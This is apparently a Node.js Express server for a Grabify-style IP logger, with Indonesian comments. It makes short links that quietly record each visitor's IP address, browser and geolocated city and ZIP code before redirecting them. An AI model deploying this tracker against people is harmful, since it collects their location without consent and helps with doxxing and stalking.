const express = require('express');
const path = require('path');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const links = {}; // Database memori sementara

// API: Ambil semua link aktif
app.get('/api/links', (req, res) => {
    res.json(links);
});

// API: Buat link baru
app.post('/api/create', (req, res) => {
    const { targetUrl } = req.body;
    if (!targetUrl) return res.status(400).json({ error: 'URL diperlukan' });

    const slug = Math.random().toString(36).substring(2, 8);
    links[slug] = {
        targetUrl: targetUrl.startsWith('http') ? targetUrl : `https://${targetUrl}`,
        createdAt: new Date(),
        logs: []
    };
    res.json({ success: true, slug });
});

// API: Ambil log berdasarkan slug
app.get('/api/logs/:slug', (req, res) => {
    const { slug } = req.params;
    const linkData = links[slug];
    if (!linkData) return res.json({ success: false });

    res.json({
        success: true,
        targetUrl: linkData.targetUrl,
        logs: linkData.logs
    });
});

// Endpoint Tracker Utama (Grabify Link Handler)
app.get('/t/:slug', async (req, res) => {
    const { slug } = req.params;
    const linkData = links[slug];

    if (!linkData) return res.status(404).send('Link tidak valid atau sudah kedaluwarsa.');

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1' || ip === '127.0.0.1') ip = '8.8.8.8'; // Fallback localhost
    const userAgent = req.headers['user-agent'] || 'Unknown';

    let locationStr = 'Tidak diketahui';
    try {
        const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
        if (geoRes.data && geoRes.data.status === 'success') {
            locationStr = `${geoRes.data.city}, ${geoRes.data.regionName}, ${geoRes.data.country} (ZIP: ${geoRes.data.zip || 'N/A'})`;
        }
    } catch (err) {
        console.error('Gagal mengambil geolokasi:', err.message);
    }

    // Catat log
    linkData.logs.push({
        time: new Date().toISOString(),
        ip,
        userAgent,
        location: locationStr
    });

    // Redirect ke URL target
    res.redirect(linkData.targetUrl);
});

app.listen(PORT, () => {
    console.log(`Server IPLogger berjalan di http://localhost:${PORT}`);
});
